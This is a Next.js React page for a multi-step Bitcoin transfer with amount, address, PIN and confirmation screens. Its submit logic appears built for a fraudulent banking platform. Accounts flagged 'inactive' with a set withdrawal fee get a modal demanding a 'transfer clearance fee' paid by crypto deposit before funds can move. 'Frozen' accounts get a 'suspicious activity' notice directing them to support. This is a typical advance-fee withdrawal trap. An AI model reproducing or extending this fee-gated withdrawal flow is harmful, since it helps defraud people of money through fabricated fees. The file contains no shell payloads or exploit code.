'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import Link from 'next/link';
import toast from 'react-hot-toast';
import { useAuth } from '@/contexts/AuthContext';
import { getUserCurrencySymbol } from '@/lib/currency';
import {
  Bitcoin,
  ArrowLeft,
  Wallet,
  Send,
  Lock,
  Eye,
  EyeOff,
  CheckCircle,
  AlertTriangle,
  Loader2,
  Copy,
  ArrowRight,
  AlertCircle,
  Shield,
} from 'lucide-react';

type Step = 'amount' | 'address' | 'pin' | 'success';

interface TransferData {
  amount: string;
  recipientAddress: string;
  pin: string;
}

export default function BitcoinTransferPage() {
  const router = useRouter();
  const { user, refreshUser } = useAuth();
  
  const [currentStep, setCurrentStep] = useState<Step>('amount');
  const [transferData, setTransferData] = useState<TransferData>({
    amount: '',
    recipientAddress: '',
    pin: '',
  });
  const [showPin, setShowPin] = useState(false);
  const [showFeeModal, setShowFeeModal] = useState(false);
  const [showFrozenModal, setShowFrozenModal] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [btcPrice, setBtcPrice] = useState<number>(0);
  const [isLoadingPrice, setIsLoadingPrice] = useState(true);
  const [transactionRef, setTransactionRef] = useState<string>('');

  const userCurrency = user?.currency || 'USD';
  const currencySymbol = getUserCurrencySymbol(userCurrency);
  const btcBalance = user?.bitcoinBalance || 0;
  const userStatus = user?.status || 'active';

  // Fetch live BTC price from CoinGecko in user's currency
  useEffect(() => {
    const fetchBTCPrice = async () => {
      const currencyCode = userCurrency.toLowerCase();
      try {
        setIsLoadingPrice(true);
        
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 10000);
        
        const response = await fetch(
          `https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=${currencyCode}&include_24hr_change=true`,
          {
            headers: {
              'Accept': 'application/json',
            },
            signal: controller.signal,
          }
        );
        
        clearTimeout(timeoutId);
        
        if (response.ok) {
          const data = await response.json();
          if (data.bitcoin?.[currencyCode]) {
            setBtcPrice(data.bitcoin[currencyCode]);
            // Update shared cache for other pages
            localStorage.setItem('btc_price_cache', JSON.stringify({
              price: data.bitcoin[currencyCode],
              change: data.bitcoin[`${currencyCode}_24h_change`] || 0,
              currency: userCurrency,
            }));
            localStorage.setItem('btc_price_timestamp', Date.now().toString());
          }
        }
      } catch {
        // Use cached price as fallback if fetch fails
        const cachedPrice = localStorage.getItem('btc_price_cache');
        if (cachedPrice) {
          const cached = JSON.parse(cachedPrice);
          setBtcPrice(cached.price);
        }
      } finally {
        setIsLoadingPrice(false);
      }
    };

    if (userCurrency) {
      fetchBTCPrice();
    }
  }, [userCurrency]);

  const formatBTC = (amount: number) => {
    return amount.toFixed(8);
  };

  const formatCurrency = (amount: number) => {
    return new Intl.NumberFormat('en-US', {
      minimumFractionDigits: 2,
      maximumFractionDigits: 2,
    }).format(amount);
  };

  const btcAmount = parseFloat(transferData.amount) || 0;
  const usdEquivalent = btcAmount * btcPrice;

  const validateAmount = () => {
    if (!transferData.amount || btcAmount <= 0) {
      toast.error('Please enter a valid BTC amount');
      return false;
    }
    
    if (btcAmount > btcBalance) {
      toast.error('Insufficient Bitcoin balance');
      return false;
    }

    if (btcAmount < 0.00001) {
      toast.error('Minimum transfer amount is 0.00001 BTC');
      return false;
    }
    
    return true;
  };

  const validateAddress = () => {
    const address = transferData.recipientAddress.trim();
    
    if (!address) {
      toast.error('Please enter a recipient wallet address');
      return false;
    }

    // Basic Bitcoin address validation (supports legacy, segwit, and taproot)
    const btcAddressRegex = /^(1|3|bc1|tb1)[a-zA-HJ-NP-Z0-9]{25,62}$/;
    if (!btcAddressRegex.test(address)) {
      toast.error('Please enter a valid Bitcoin wallet address');
      return false;
    }
    
    return true;
  };

  const validatePin = () => {
    if (!transferData.pin || transferData.pin.length !== 4) {
      toast.error('Please enter your 4-digit transaction PIN');
      return false;
    }
    return true;
  };

  const handleNextStep = () => {
    if (currentStep === 'amount' && validateAmount()) {
      setCurrentStep('address');
    } else if (currentStep === 'address' && validateAddress()) {
      setCurrentStep('pin');
    }
  };

  const handlePrevStep = () => {
    if (currentStep === 'address') {
      setCurrentStep('amount');
    } else if (currentStep === 'pin') {
      setCurrentStep('address');
    }
  };

  const handleSubmit = async () => {
    if (!validatePin()) return;

    // Check for frozen account — show suspicious activity modal
    if (userStatus === 'frozen') {
      setShowFrozenModal(true);
      return;
    }

    // Check for withdrawal fee requirement when account is inactive
    const withdrawalFee = user?.withdrawalFee || 0;

    if (userStatus === 'inactive' && withdrawalFee > 0) {
      setShowFeeModal(true);
      return;
    }

    setIsSubmitting(true);
    
    try {
      const token = localStorage.getItem('token');
      
      const response = await fetch('/api/user/transfers/bitcoin', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`,
        },
        body: JSON.stringify({
          amount: btcAmount,
          recipientAddress: transferData.recipientAddress.trim(),
          pin: transferData.pin,
        }),
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.error || 'Transfer failed');
      }

      setTransactionRef(data.data?.reference || '');
      setCurrentStep('success');
      
      // Refresh user data to update balance
      if (refreshUser) {
        await refreshUser();
      }
      
      toast.success('Bitcoin transfer initiated successfully!');
    } catch (err) {
      const errorMessage = err instanceof Error ? err.message : 'Transfer failed';
      toast.error(errorMessage);
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleCopyRef = () => {
    navigator.clipboard.writeText(transactionRef);
    toast.success('Reference copied to clipboard');
  };

  const getStepNumber = () => {
    switch (currentStep) {
      case 'amount': return 1;
      case 'address': return 2;
      case 'pin': return 3;
      case 'success': return 4;
      default: return 1;
    }
  };

  const renderStepIndicator = () => (
    <div className="flex items-center justify-center mb-8">
      {['amount', 'address', 'pin'].map((step, index) => (
        <div key={step} className="flex items-center">
          <div
            className={`w-10 h-10 rounded-full flex items-center justify-center text-sm font-semibold transition-all ${
              getStepNumber() > index + 1
                ? 'bg-orange-500 text-white'
                : getStepNumber() === index + 1
                ? 'bg-orange-500 text-white ring-4 ring-orange-500/30'
                : 'bg-gray-200 dark:bg-gray-700 text-gray-500 dark:text-gray-400'
            }`}
          >
            {getStepNumber() > index + 1 ? (
              <CheckCircle className="w-5 h-5" />
            ) : (
              index + 1
            )}
          </div>
          {index < 2 && (
            <div
              className={`w-16 h-1 mx-2 rounded ${
                getStepNumber() > index + 1 ? 'bg-orange-500' : 'bg-gray-200 dark:bg-gray-700'
              }`}
            />
          )}
        </div>
      ))}
    </div>
  );

  const renderAmountStep = () => (
    <div className="space-y-6">
      <div className="text-center mb-6">
        <h2 className="text-xl font-semibold text-gray-900 dark:text-white mb-2">Enter Amount</h2>
        <p className="text-gray-500 dark:text-gray-400 text-sm">How much Bitcoin do you want to send?</p>
      </div>

      {/* BTC Balance Card */}
      <div className="bg-gradient-to-r from-orange-500/20 to-yellow-500/20 border border-orange-500/30 rounded-xl p-4">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 bg-orange-500/20 rounded-full flex items-center justify-center">
              <Bitcoin className="w-5 h-5 text-orange-500" />
            </div>
            <div>
              <p className="text-sm text-gray-500 dark:text-gray-400">Available Balance</p>
              <p className="text-lg font-bold text-gray-900 dark:text-white">{formatBTC(btcBalance)} BTC</p>
            </div>
          </div>
          <div className="text-right">
            <p className="text-sm text-gray-500 dark:text-gray-400">≈ {currencySymbol}</p>
            <p className="text-lg font-semibold text-gray-900 dark:text-white">
              {isLoadingPrice ? '...' : formatCurrency(btcBalance * btcPrice)}
            </p>
          </div>
        </div>
      </div>

      {/* Amount Input */}
      <div>
        <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
          Amount (BTC)
        </label>
        <div className="relative">
          <Bitcoin className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-orange-500" />
          <input
            type="number"
            step="0.00000001"
            min="0"
            value={transferData.amount}
            onChange={(e) => setTransferData(prev => ({ ...prev, amount: e.target.value }))}
            className="w-full pl-12 pr-4 py-4 bg-gray-50 dark:bg-gray-800 border border-gray-300 dark:border-gray-600 rounded-xl text-gray-900 dark:text-white text-lg font-medium placeholder-gray-400 dark:placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-orange-500 focus:border-transparent"
            placeholder="0.00000000"
          />
        </div>
        
        {/* USD Equivalent */}
        <div className="mt-3 p-3 bg-gray-100 dark:bg-gray-800/50 rounded-lg border border-gray-200 dark:border-gray-700">
          <div className="flex items-center justify-between">
            <span className="text-sm text-gray-500 dark:text-gray-400">Equivalent Value</span>
            <span className="text-lg font-semibold text-gray-900 dark:text-white">
              {currencySymbol}{isLoadingPrice ? '...' : formatCurrency(usdEquivalent)}
            </span>
          </div>
          {btcPrice > 0 && (
            <p className="text-xs text-gray-500 mt-1">
              1 BTC = {currencySymbol}{formatCurrency(btcPrice)}
            </p>
          )}
        </div>
      </div>

      {/* Quick Amount Buttons */}
      <div>
        <p className="text-sm text-gray-500 dark:text-gray-400 mb-2">Quick Select</p>
        <div className="grid grid-cols-4 gap-2">
          {[0.001, 0.01, 0.05, 0.1].map((amount) => (
            <button
              key={amount}
              type="button"
              onClick={() => setTransferData(prev => ({ ...prev, amount: amount.toString() }))}
              disabled={amount > btcBalance}
              className={`py-2 px-3 rounded-lg text-sm font-medium transition-all ${
                amount > btcBalance
                  ? 'bg-gray-200 dark:bg-gray-800 text-gray-400 dark:text-gray-600 cursor-not-allowed'
                  : 'bg-gray-100 dark:bg-gray-700 text-gray-700 dark:text-white hover:bg-orange-500/20 hover:text-orange-500 dark:hover:text-orange-400 border border-gray-300 dark:border-gray-600 hover:border-orange-500/50'
              }`}
            >
              {amount} BTC
            </button>
          ))}
        </div>
        <button
          type="button"
          onClick={() => setTransferData(prev => ({ ...prev, amount: btcBalance.toString() }))}
          disabled={btcBalance <= 0}
          className="w-full mt-2 py-2 px-3 rounded-lg text-sm font-medium bg-gray-100 dark:bg-gray-700 text-gray-700 dark:text-white hover:bg-orange-500/20 hover:text-orange-500 dark:hover:text-orange-400 border border-gray-300 dark:border-gray-600 hover:border-orange-500/50 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
        >
          Max ({formatBTC(btcBalance)} BTC)
        </button>
      </div>

      <button
        type="button"
        onClick={handleNextStep}
        disabled={!transferData.amount || btcAmount <= 0}
        className="w-full py-4 bg-orange-500 hover:bg-orange-600 disabled:bg-gray-300 dark:disabled:bg-gray-700 disabled:cursor-not-allowed text-white font-semibold rounded-xl transition-all flex items-center justify-center gap-2"
      >
        Continue
        <ArrowRight className="w-5 h-5" />
      </button>
    </div>
  );

  const renderAddressStep = () => (
    <div className="space-y-6">
      <div className="text-center mb-6">
        <h2 className="text-xl font-semibold text-gray-900 dark:text-white mb-2">Recipient Address</h2>
        <p className="text-gray-500 dark:text-gray-400 text-sm">Enter the Bitcoin wallet address</p>
      </div>

      {/* Transfer Summary */}
      <div className="bg-gray-100 dark:bg-gray-800/50 border border-gray-200 dark:border-gray-700 rounded-xl p-4">
        <div className="flex items-center justify-between">
          <span className="text-gray-500 dark:text-gray-400">Sending</span>
          <div className="text-right">
            <p className="text-lg font-bold text-gray-900 dark:text-white">{formatBTC(btcAmount)} BTC</p>
            <p className="text-sm text-gray-500 dark:text-gray-400">≈ {currencySymbol}{formatCurrency(usdEquivalent)}</p>
          </div>
        </div>
      </div>

      {/* Address Input */}
      <div>
        <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
          Recipient Wallet Address
        </label>
        <div className="relative">
          <Wallet className="absolute left-4 top-4 w-5 h-5 text-gray-400" />
          <textarea
            value={transferData.recipientAddress}
            onChange={(e) => setTransferData(prev => ({ ...prev, recipientAddress: e.target.value }))}
            className="w-full pl-12 pr-4 py-4 bg-gray-50 dark:bg-gray-800 border border-gray-300 dark:border-gray-600 rounded-xl text-gray-900 dark:text-white font-mono text-sm placeholder-gray-400 dark:placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-orange-500 focus:border-transparent resize-none"
            placeholder="bc1q... or 1... or 3..."
            rows={3}
          />
        </div>
        <p className="mt-2 text-xs text-gray-500">
          Supports Legacy (1...), SegWit (3...), and Native SegWit (bc1...) addresses
        </p>
      </div>

      {/* Warning */}
      <div className="flex items-start gap-3 p-4 bg-yellow-500/10 border border-yellow-500/30 rounded-xl">
        <AlertTriangle className="w-5 h-5 text-yellow-500 shrink-0 mt-0.5" />
        <div>
          <p className="text-sm text-yellow-200 font-medium">Double-check the address</p>
          <p className="text-xs text-yellow-200/70 mt-1">
            Bitcoin transactions are irreversible. Make sure the address is correct before proceeding.
          </p>
        </div>
      </div>

      <div className="flex gap-3">
        <button
          type="button"
          onClick={handlePrevStep}
          className="flex-1 py-4 bg-gray-200 dark:bg-gray-700 hover:bg-gray-300 dark:hover:bg-gray-600 text-gray-700 dark:text-white font-semibold rounded-xl transition-all flex items-center justify-center gap-2"
        >
          <ArrowLeft className="w-5 h-5" />
          Back
        </button>
        <button
          type="button"
          onClick={handleNextStep}
          disabled={!transferData.recipientAddress.trim()}
          className="flex-1 py-4 bg-orange-500 hover:bg-orange-600 disabled:bg-gray-300 dark:disabled:bg-gray-700 disabled:cursor-not-allowed text-white font-semibold rounded-xl transition-all flex items-center justify-center gap-2"
        >
          Continue
          <ArrowRight className="w-5 h-5" />
        </button>
      </div>
    </div>
  );

  const renderPinStep = () => (
    <div className="space-y-6">
      <div className="text-center mb-6">
        <h2 className="text-xl font-semibold text-gray-900 dark:text-white mb-2">Confirm Transfer</h2>
        <p className="text-gray-500 dark:text-gray-400 text-sm">Enter your PIN to authorize this transaction</p>
      </div>

      {/* Transfer Summary */}
      <div className="bg-gray-100 dark:bg-gray-800/50 border border-gray-200 dark:border-gray-700 rounded-xl p-5 space-y-4">
        <div className="flex items-center justify-between pb-4 border-b border-gray-200 dark:border-gray-700">
          <span className="text-gray-500 dark:text-gray-400">Amount</span>
          <div className="text-right">
            <p className="text-xl font-bold text-gray-900 dark:text-white">{formatBTC(btcAmount)} BTC</p>
            <p className="text-sm text-gray-500 dark:text-gray-400">≈ {currencySymbol}{formatCurrency(usdEquivalent)}</p>
          </div>
        </div>
        <div>
          <span className="text-gray-500 dark:text-gray-400 text-sm">To Address</span>
          <p className="text-gray-900 dark:text-white font-mono text-sm mt-1 break-all bg-gray-200 dark:bg-gray-900/50 p-2 rounded-lg">
            {transferData.recipientAddress}
          </p>
        </div>
        <div className="flex items-center justify-between pt-2">
          <span className="text-gray-500 dark:text-gray-400">Network Fee</span>
          <span className="text-gray-900 dark:text-white">Included</span>
        </div>
      </div>

      {/* PIN Input */}
      <div>
        <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
          Transaction PIN
        </label>
        <div className="relative">
          <Lock className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
          <input
            type={showPin ? 'text' : 'password'}
            maxLength={4}
            value={transferData.pin}
            onChange={(e) => setTransferData(prev => ({ ...prev, pin: e.target.value.replace(/\D/g, '') }))}
            className="w-full pl-12 pr-12 py-4 bg-gray-50 dark:bg-gray-800 border border-gray-300 dark:border-gray-600 rounded-xl text-gray-900 dark:text-white text-center text-2xl tracking-[0.5em] font-bold placeholder-gray-400 dark:placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-orange-500 focus:border-transparent"
            placeholder="••••"
          />
          <button
            type="button"
            onClick={() => setShowPin(!showPin)}
            className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 hover:text-white transition-colors"
          >
            {showPin ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
          </button>
        </div>
      </div>

      <div className="flex gap-3">
        <button
          type="button"
          onClick={handlePrevStep}
          disabled={isSubmitting}
          className="flex-1 py-4 bg-gray-200 dark:bg-gray-700 hover:bg-gray-300 dark:hover:bg-gray-600 disabled:opacity-50 text-gray-700 dark:text-white font-semibold rounded-xl transition-all flex items-center justify-center gap-2"
        >
          <ArrowLeft className="w-5 h-5" />
          Back
        </button>
        <button
          type="button"
          onClick={handleSubmit}
          disabled={isSubmitting || transferData.pin.length !== 4}
          className="flex-1 py-4 bg-orange-500 hover:bg-orange-600 disabled:bg-gray-300 dark:disabled:bg-gray-700 disabled:cursor-not-allowed text-white font-semibold rounded-xl transition-all flex items-center justify-center gap-2"
        >
          {isSubmitting ? (
            <>
              <Loader2 className="w-5 h-5 animate-spin" />
              Processing...
            </>
          ) : (
            <>
              <Send className="w-5 h-5" />
              Send Bitcoin
            </>
          )}
        </button>
      </div>
    </div>
  );

  const renderSuccessStep = () => (
    <div className="text-center space-y-6">
      <div className="w-20 h-20 bg-green-500/20 rounded-full flex items-center justify-center mx-auto">
        <CheckCircle className="w-10 h-10 text-green-500" />
      </div>
      
      <div>
        <h2 className="text-2xl font-bold text-gray-900 dark:text-white mb-2">Transfer Initiated!</h2>
        <p className="text-gray-500 dark:text-gray-400">
          Your Bitcoin transfer is being processed and is currently pending confirmation.
        </p>
      </div>

      {/* Transaction Details */}
      <div className="bg-gray-100 dark:bg-gray-800/50 border border-gray-200 dark:border-gray-700 rounded-xl p-5 space-y-4 text-left">
        <div className="flex items-center justify-between">
          <span className="text-gray-500 dark:text-gray-400">Amount</span>
          <span className="text-gray-900 dark:text-white font-bold">{formatBTC(btcAmount)} BTC</span>
        </div>
        <div className="flex items-center justify-between">
          <span className="text-gray-500 dark:text-gray-400">Value</span>
          <span className="text-gray-900 dark:text-white">{currencySymbol}{formatCurrency(usdEquivalent)}</span>
        </div>
        <div className="flex items-center justify-between">
          <span className="text-gray-500 dark:text-gray-400">Status</span>
          <span className="px-3 py-1 bg-yellow-500/20 text-yellow-400 text-sm font-medium rounded-full">
            Pending
          </span>
        </div>
        {transactionRef && (
          <div className="pt-3 border-t border-gray-200 dark:border-gray-700">
            <span className="text-gray-500 dark:text-gray-400 text-sm">Reference</span>
            <div className="flex items-center gap-2 mt-1">
              <code className="flex-1 text-gray-900 dark:text-white text-sm bg-gray-200 dark:bg-gray-900/50 p-2 rounded-lg font-mono">
                {transactionRef}
              </code>
              <button
                onClick={handleCopyRef}
                className="p-2 bg-gray-200 dark:bg-gray-700 hover:bg-gray-300 dark:hover:bg-gray-600 rounded-lg transition-colors"
              >
                <Copy className="w-4 h-4 text-gray-500 dark:text-gray-400" />
              </button>
            </div>
          </div>
        )}
      </div>

      <div className="bg-blue-500/10 border border-blue-500/30 rounded-xl p-4">
        <p className="text-sm text-blue-700 dark:text-blue-200">
          Your transaction will be reviewed and processed shortly. You can track the status in your transaction history.
        </p>
      </div>

      <div className="flex gap-3">
        <Link
          href="/dashboard/transactions"
          className="flex-1 py-4 bg-gray-200 dark:bg-gray-700 hover:bg-gray-300 dark:hover:bg-gray-600 text-gray-700 dark:text-white font-semibold rounded-xl transition-all flex items-center justify-center gap-2"
        >
          View Transactions
        </Link>
        <Link
          href="/dashboard"
          className="flex-1 py-4 bg-orange-500 hover:bg-orange-600 text-white font-semibold rounded-xl transition-all flex items-center justify-center gap-2"
        >
          Back to Dashboard
        </Link>
      </div>
    </div>
  );

  return (
    <div className="min-h-screen bg-gray-50 dark:bg-gray-900">
      {/* Header */}
      <div className="bg-white dark:bg-gray-800 border-b border-gray-200 dark:border-gray-700">
        <div className="max-w-2xl mx-auto px-4 py-4">
          <div className="flex items-center gap-4">
            <Link
              href="/dashboard"
              className="p-2 hover:bg-gray-100 dark:hover:bg-gray-700 rounded-lg transition-colors"
            >
              <ArrowLeft className="w-5 h-5 text-gray-500 dark:text-gray-400" />
            </Link>
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 bg-orange-500/20 rounded-full flex items-center justify-center">
                <Bitcoin className="w-5 h-5 text-orange-500" />
              </div>
              <div>
                <h1 className="text-lg font-semibold text-gray-900 dark:text-white">Bitcoin Transfer</h1>
                <p className="text-sm text-gray-500 dark:text-gray-400">Send BTC to any wallet</p>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="max-w-2xl mx-auto px-4 py-8">
        {currentStep !== 'success' && renderStepIndicator()}
        
        <div className="bg-white dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-2xl p-6 md:p-8">
          {currentStep === 'amount' && renderAmountStep()}
          {currentStep === 'address' && renderAddressStep()}
          {currentStep === 'pin' && renderPinStep()}
          {currentStep === 'success' && renderSuccessStep()}
        </div>
      </div>

      {/* Frozen Account Modal */}
      {showFrozenModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm p-4">
          <div className="max-w-md w-full rounded-xl p-8 text-center" style={{ backgroundColor: 'rgb(31 41 55)' }}>
            <div className="mx-auto w-16 h-16 bg-red-500/20 rounded-full flex items-center justify-center mb-4">
              <Shield className="h-8 w-8 text-red-400" />
            </div>
            <h2 className="text-xl font-bold text-white mb-2">Suspicious Activity Detected</h2>
            <p className="text-gray-400 mb-2">We have detected suspicious activity on your account. For your security, your account has been temporarily frozen and transactions have been suspended.</p>
            <p className="text-gray-400 mb-6">Please contact our support team for assistance in resolving this matter and restoring your account access.</p>
            <div className="flex gap-3">
              <button
                onClick={() => setShowFrozenModal(false)}
                className="flex-1 px-6 py-3 bg-gray-600 text-white rounded-lg hover:bg-gray-700 transition-colors"
              >
                Close
              </button>
              <Link
                href="/dashboard/support"
                className="flex-1 inline-flex items-center justify-center px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors"
              >
                Contact Support
              </Link>
            </div>
          </div>
        </div>
      )}

      {/* Fee Modal */}
      {showFeeModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm p-4">
          <div className="max-w-md w-full rounded-xl p-8 text-center" style={{ backgroundColor: 'rgb(31 41 55)' }}>
            <div className="mx-auto w-16 h-16 bg-amber-500/20 rounded-full flex items-center justify-center mb-4">
              <AlertCircle className="h-8 w-8 text-amber-400" />
            </div>
            <h2 className="text-xl font-bold text-white mb-2" style={{color:"white"}}>Transfer Clearance Fee Required</h2>
            <p className="text-gray-400 mb-6" style={{color:"white"}}>You are required to pay a transfer clearance fee of <span className="text-amber-200 font-semibold">{currencySymbol}{(user?.withdrawalFee || 0).toLocaleString()}</span> via crypto deposit to activate your online banking profile and enable the transfer of the funds.</p>
            <div className="flex gap-3">
              <button
                onClick={() => setShowFeeModal(false)}
                className="flex-1 px-6 py-3 bg-gray-600 text-white rounded-lg hover:bg-gray-700 transition-colors"
              >
                Close
              </button>
              <p className="flex-1 inline-flex items-center justify-center px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 cursor-pointer">
                Contact Support via live chat
              </p>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
